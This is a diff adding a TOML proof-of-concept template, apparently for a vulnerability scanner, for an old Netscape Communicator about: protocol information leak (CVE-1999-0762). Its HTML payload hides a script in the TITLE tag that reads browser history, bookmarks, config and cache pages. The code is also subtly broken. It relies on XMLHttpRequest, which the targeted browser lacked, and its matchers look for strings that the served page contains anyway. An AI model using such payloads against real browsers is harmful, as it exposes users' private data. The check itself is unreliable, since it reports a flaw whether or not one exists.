@@ -1,0 +1,76 @@
+[info]
+author = "ave"
+description = "验证 Netscape Communicator TITLE 标签 JavaScript about: 协议信息泄露漏洞"
+id = "POC-AVE-1999-0478"
+name = "CVE-1999-0762 PoC"
+severity = "low"
+tags = ["ave-1999-0478"]
+vuln_id = [
+    "CVE-1999-0762",
+    "AVE-1999-0478",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = '''
+<html>
+<head>
+<title><script>
+function leakInfo() {
+  // 尝试通过 about: 协议访问浏览器内部信息
+  var targets = [
+    "about:history",
+    "about:bookmarks",
+    "about:config",
+    "about:cache",
+    "about:plugins",
+    "about:mozilla"
+  ];
+  var results = [];
+  for (var i = 0; i < targets.length; i++) {
+    try {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", targets[i], false);
+      xhr.send();
+      if (xhr.status === 200 && xhr.responseText.length > 0) {
+        results.push(targets[i] + ": " + xhr.responseText.substring(0, 200));
+      }
+    } catch (e) {
+      results.push(targets[i] + ": " + e.message);
+    }
+  }
+  document.body.innerHTML = "<pre>" + results.join("\\n") + "</pre>";
+}
+window.onload = leakInfo;
+</script></title>
+</head>
+<body>
+<h1>Netscape Communicator about: 协议信息泄露测试</h1>
+<p>如果浏览器易受攻击，将显示浏览器内部信息（历史记录、书签、配置等）。</p>
+<p>注意：此漏洞仅影响旧版 Netscape Communicator (4.x 及更早版本)。现代浏览器不受影响。</p>
+</body>
+</html>'''
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/html"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "about:history",
+    "about:bookmarks",
+    "about:config",
+    "about:cache",
+    "about:plugins",
+    "about:mozilla",
+]
